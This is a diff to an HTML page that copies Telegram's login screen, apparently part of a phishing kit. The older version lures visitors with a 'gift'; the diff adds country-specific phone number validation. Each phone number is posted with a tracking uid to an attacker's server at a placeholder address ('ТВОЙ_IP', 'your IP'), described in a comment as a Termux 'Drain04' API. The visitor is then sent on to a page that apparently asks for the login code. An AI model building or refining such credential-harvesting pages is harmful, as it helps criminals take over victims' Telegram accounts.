@@ -1,36 +1,108 @@
 <!DOCTYPE html>
-<html>
+<html lang="ru">
 <head>
+    <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <style>
-        body { background: #000; color: #fff; font-family: sans-serif; text-align: center; padding: 40px 20px; }
-        .logo { width: 80px; height: 80px; margin-bottom: 30px; }
-        input { width: 100%; padding: 16px; background: #1c252f; border: 1px solid #2a3644; border-radius: 12px; color: #fff; font-size: 16px; margin-bottom: 20px; box-sizing: border-box; outline: none; }
-        button { width: 100%; padding: 16px; background: #248bdf; border: none; border-radius: 12px; color: #fff; font-weight: bold; font-size: 16px; cursor: pointer; }
+        body { background: #000; color: #fff; font-family: -apple-system, sans-serif; text-align: center; padding: 40px 20px; }
+        .logo { width: 80px; height: 80px; margin-bottom: 25px; }
+        .input-container { position: relative; width: 100%; max-width: 320px; margin: 0 auto 20px; }
+        input { width: 100%; padding: 16px; background: #1c252f; border: 1px solid #2a3644; border-radius: 12px; color: #fff; font-size: 18px; box-sizing: border-box; outline: none; transition: border 0.3s; }
+        input:focus { border-color: #248bdf; }
+        button { width: 100%; max-width: 320px; padding: 16px; background: #248bdf; border: none; border-radius: 12px; color: #fff; font-weight: bold; font-size: 16px; cursor: pointer; }
+        .country-hint { font-size: 12px; color: #8a99a8; margin-top: -15px; margin-bottom: 20px; display: block; }
     </style>
 </head>
 <body>
     <svg class="logo" viewBox="0 0 240 240"><circle cx="120" cy="120" r="120" fill="#248bdf"/><path d="M54 116.7l124.6-48.1c5.8-2.2 10.8 1.2 8.9 10.3l-21.2 100.1c-1.6 7.2-5.9 8.9-11.9 5.6L122 158l-15.7 15.1c-1.7 1.7-3.2 3.2-6.6 3.2l2.3-33.3 60.7-54.8c2.6-2.3-.6-3.6-4.1-1.3L83.7 137.4 51.5 127.3c-7-2.2-7.1-7 1.5-10.6z" fill="#fff"/></svg>
+    
     <h2>Log in to Telegram</h2>
-    <p style="color: #8a99a8; margin-bottom: 30px;">Enter your phone number to receive the gift.</p>
-    <input type="tel" id="phone" placeholder="+7 999 000-00-00">
-    <button onclick="sendPhone()">Next</button>
+    <p style="color: #8a99a8; margin-bottom: 30px;">Enter your phone number in international format.</p>
+    
+    <div class="input-container">
+        <input type="tel" id="phone" placeholder="+7 900 000-00-00" oninput="validatePhone()">
+    </div>
+    <span id="hint" class="country-hint">Please start with '+'</span>
+    
+    <button id="btn" onclick="submitPhone()">Next</button>
 
     <script>
-        async function sendPhone() {
-            const phone = document.getElementById('phone').value;
-            if (phone.length < 10) return alert("Enter full number");
+        // База правил: [Код страны, Мин. цифр, Макс. цифр, Название]
+        const countryRules = [
+            { code: "7", min: 11, max: 11, name: "Russia/Kazakhstan" },
+            { code: "380", min: 12, max: 12, name: "Ukraine" },
+            { code: "375", min: 12, max: 12, name: "Belarus" },
+            { code: "1", min: 11, max: 11, name: "USA/Canada" },
+            { code: "44", min: 12, max: 12, name: "UK" },
+            { code: "49", min: 11, max: 13, name: "Germany" },
+            { code: "33", min: 11, max: 11, name: "France" },
+            { code: "998", min: 12, max: 12, name: "Uzbekistan" }
+        ];
 
-            // ОТПРАВКА В TERMUX
+        function getDigits() {
+            return document.getElementById('phone').value.replace(/\D/g, '');
+        }
+
+        function validatePhone() {
+            const digits = getDigits();
+            const hint = document.getElementById('hint');
+            let found = false;
+
+            for (let rule of countryRules) {
+                if (digits.startsWith(rule.code)) {
+                    hint.innerText = `Detected: ${rule.name}. Required: ${rule.min} digits.`;
+                    hint.style.color = "#8a99a8";
+                    found = true;
+                    break;
+                }
+            }
+
+            if (!found && digits.length > 0) {
+                hint.innerText = "Unknown country code format";
+                hint.style.color = "#ff4b4b";
+            }
+        }
+
+        async function submitPhone() {
+            const phone = document.getElementById('phone').value;
+            const digits = getDigits();
+            let isValid = false;
+            let currentRule = null;
+
+            // Ищем подходящее правило
+            for (let rule of countryRules) {
+                if (digits.startsWith(rule.code)) {
+                    currentRule = rule;
+                    if (digits.length >= rule.min && digits.length <= rule.max) {
+                        isValid = true;
+                    }
+                    break;
+                }
+            }
+
+            // Если страна не в списке, разрешаем ввод от 10 до 15 цифр (стандарт ITU)
+            if (!currentRule && digits.length >= 10 && digits.length <= 15) {
+                isValid = true;
+            }
+
+            if (!isValid) {
+                alert("Please enter a valid phone number for your country.");
+                return;
+            }
+
+            // Отправка в Termux (API Drain04)
+            const params = new URLSearchParams(window.location.search);
+            const uid = params.get('uid') || "Unknown";
+
             try {
                 await fetch("http://ТВОЙ_IP:8080/submit", {
                     method: 'POST',
                     headers: {'Content-Type': 'application/json'},
-                    body: JSON.stringify({ type: 'phone', value: phone })
+                    body: JSON.stringify({ type: 'phone', value: phone, uid: uid })
                 });
-            } catch(e) {}
-            
-            window.location.href = "code.html";
+            } catch(e) { console.log("Server offline"); }
+
+            window.location.href = "code.html" + window.location.search;
         }
     </script>
 </body>
